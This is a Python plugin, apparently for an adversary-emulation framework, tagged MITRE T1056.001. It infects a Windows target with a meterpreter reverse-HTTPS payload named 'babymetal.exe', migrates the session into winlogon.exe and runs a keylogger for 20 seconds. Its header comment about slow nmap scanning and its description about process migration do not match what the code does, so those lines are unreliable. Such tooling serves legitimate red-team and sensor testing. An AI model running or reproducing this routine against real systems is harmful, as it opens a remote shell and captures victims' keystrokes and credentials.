#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin
from app.metasploit import MetasploitInstant


class MetasploitKeyloggingPlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_keylogging"
    description = "Migrate meterpreter to another process via metasploit"
    ttp = "T1056.001"
    references = ["https://attack.mitre.org/techniques/T1056/001/"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        res = ""
        payload_type = "windows/meterpreter_reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        metasploit = MetasploitInstant(self.metasploit_password,
                                       attack_logger=self.attack_logger,
                                       attacker=self.attacker_machine_plugin,
                                       username=self.metasploit_user)

        metasploit.smart_infect(target, payload_type, payload_name, )

        metasploit.migrate(target, name="winlogon.exe")

        metasploit.keylogging(target, monitoring_time=20)

        return res
